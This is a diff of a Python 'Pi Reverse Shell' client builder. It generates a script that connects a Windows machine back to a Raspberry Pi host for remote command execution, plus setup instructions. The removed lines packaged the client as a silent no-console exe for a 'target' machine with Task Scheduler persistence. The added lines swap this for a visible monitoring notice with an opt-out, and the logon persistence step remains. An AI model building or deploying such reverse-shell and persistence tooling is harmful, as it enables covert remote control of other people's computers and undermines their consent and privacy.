@@ -1,27 +1,32 @@
 import os
 import sys
-import subprocess
-import shutil
+import socket
 
-def check_pyinstaller():
+def detect_local_ip():
     try:
-        import PyInstaller
-        return True
-    except ImportError:
-        return False
-
-def install_pyinstaller():
-    print("[*] PyInstaller not found. Installing...")
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
-    print("[+] PyInstaller installed.")
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return None
 
 def main():
     print("=" * 52)
     print("  Pi Reverse Shell - Client Builder")
+    print("  Run this on the Raspberry Pi")
     print("=" * 52)
     print()
 
-    host = input("Enter the Pi's IP or Twingate hostname: ").strip()
+    detected_ip = detect_local_ip()
+    if detected_ip:
+        print(f"[*] Detected this Pi's IP: {detected_ip}")
+        host_input = input(f"Enter the Pi's IP or Twingate hostname [default: {detected_ip}]: ").strip()
+        host = host_input if host_input else detected_ip
+    else:
+        host = input("Enter the Pi's IP or Twingate hostname: ").strip()
+
     if not host:
         print("[!] Error: host cannot be empty.")
         sys.exit(1)
@@ -37,21 +42,51 @@ def main():
             print("[!] Invalid port. Using 6000.")
             port = 6000
 
-    exe_name = input("Enter the output .exe name (without extension) [default: client]: ").strip() or "client"
+    script_name = input("Enter the output script name (without extension) [default: client]: ").strip() or "client"
+    monitor_label = input("Enter the monitor label shown to the user (e.g. 'your school' or 'HomeNet'): ").strip() or "the system administrator"
 
     print()
 
     output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")
     os.makedirs(output_dir, exist_ok=True)
 
-    # Write a temporary configured client script for PyInstaller
     client_code = f'''import socket
 import subprocess
 import os
+import sys
 import time
 
 PI_HOST = "{host}"
 PI_PORT = {port}
+MONITOR_LABEL = "{monitor_label}"
+
+RED   = "\\033[91m"
+RESET = "\\033[0m"
+BOLD  = "\\033[1m"
+
+def show_notice():
+    os.system("cls" if os.name == "nt" else "clear")
+    print(RED + BOLD + "=" * 60 + RESET)
+    print(RED + BOLD + "  MONITORING NOTICE" + RESET)
+    print(RED + BOLD + "=" * 60 + RESET)
+    print()
+    print(RED + f"  This device is being monitored by {{MONITOR_LABEL}}." + RESET)
+    print(RED +  "  Activity on this device may be recorded and reviewed." + RESET)
+    print()
+    print(      "  If you DO NOT wish to be monitored, type  delete  and")
+    print(      "  press Enter to stop this program.")
+    print()
+    print(RED + BOLD + "=" * 60 + RESET)
+    print()
+    try:
+        answer = input("  Press Enter to continue, or type 'delete' to opt out: ").strip().lower()
+    except (KeyboardInterrupt, EOFError):
+        answer = ""
+    if answer == "delete":
+        print()
+        print("  Monitoring stopped. You may close this window.")
+        sys.exit(0)
+
 cwd = os.getcwd()
 
 def connect_to_pi():
@@ -98,44 +133,15 @@ def connect_to_pi():
             time.sleep(2)
 
 if __name__ == "__main__":
+    show_notice()
     connect_to_pi()
 '''
 
-    temp_script = os.path.join(output_dir, "_client_build_temp.py")
-    with open(temp_script, "w") as f:
+    py_path = os.path.join(output_dir, script_name + ".py")
+    with open(py_path, "w") as f:
         f.write(client_code)
 
-    if not check_pyinstaller():
-        install_pyinstaller()
-
-    build_tmp = os.path.join(output_dir, "_build_tmp")
-
-    print(f"[*] Building {exe_name}.exe — this may take a moment...")
-    result = subprocess.run(
-        [
-            sys.executable, "-m", "PyInstaller",
-            "--onefile",
-            "--noconsole",
-            "--distpath", output_dir,
-            "--workpath", build_tmp,
-            "--specpath", build_tmp,
-            "--name", exe_name,
-            temp_script,
-        ],
-        capture_output=True,
-        text=True,
-    )
-
-    # Clean up temp files
-    os.remove(temp_script)
-    if os.path.exists(build_tmp):
-        shutil.rmtree(build_tmp)
-
-    if result.returncode != 0:
-        print(f"[!] PyInstaller failed. Output:\n{result.stderr[-2000:]}")
-        sys.exit(1)
-
-    print(f"[+] {exe_name}.exe built successfully.")
+    print(f"[+] {script_name}.py created in output/")
 
     # Write setup_info.bat
     bat_content = f"""@echo off
@@ -144,9 +150,10 @@ echo ============================================================
 echo   Pi Reverse Shell ^| Setup Information
 echo ============================================================
 echo.
-echo   Pi Host  :  {host}
-echo   Port     :  {port}
-echo   EXE Name :  {exe_name}.exe
+echo   Pi Host     :  {host}
+echo   Port        :  {port}
+echo   Script Name :  {script_name}.py
+echo   Monitor Label: {monitor_label}
 echo.
 echo ============================================================
 echo   STEP 1 ^| RASPBERRY PI
@@ -163,15 +170,15 @@ echo ============================================================
 echo   STEP 2 ^| WINDOWS CLIENT
 echo ============================================================
 echo.
-echo   1. Copy {exe_name}.exe to the target Windows machine.
-echo   2. Run {exe_name}.exe — it connects silently in the background.
-echo   3. To run automatically on login, add it to Task Scheduler:
+echo   1. Copy {script_name}.py to the target Windows machine.
+echo   2. Run it with:  python {script_name}.py
+echo   3. The user will see a red monitoring notice and can opt out.
+echo   4. To run automatically on login, add it to Task Scheduler:
 echo.
 echo        - Open Task Scheduler
 echo        - Action: Create Task
 echo        - Triggers tab: New ^> At log on
-echo        - Actions tab: Start a program ^> {exe_name}.exe
-echo        - Check "Run whether user is logged on or not" if needed
+echo        - Actions tab: Start a program ^> python {script_name}.py
 echo.
 echo ============================================================
 echo   STEP 3 ^| TWINGATE (REMOTE ACCESS OVER INTERNET)
@@ -195,8 +202,8 @@ pause
     print(f"[+] setup_info.bat created.")
     print()
     print("  Output files:")
-    print(f"    output/{exe_name}.exe   — deploy to the Windows machine")
-    print(f"    output/setup_info.bat  — run for full setup instructions")
+    print(f"    output/{script_name}.py    — deploy to the Windows machine")
+    print(f"    output/setup_info.bat     — run for full setup instructions")
     print()
     print("  Don't forget to also run build_server.py to generate server.py for the Pi.")
     print()
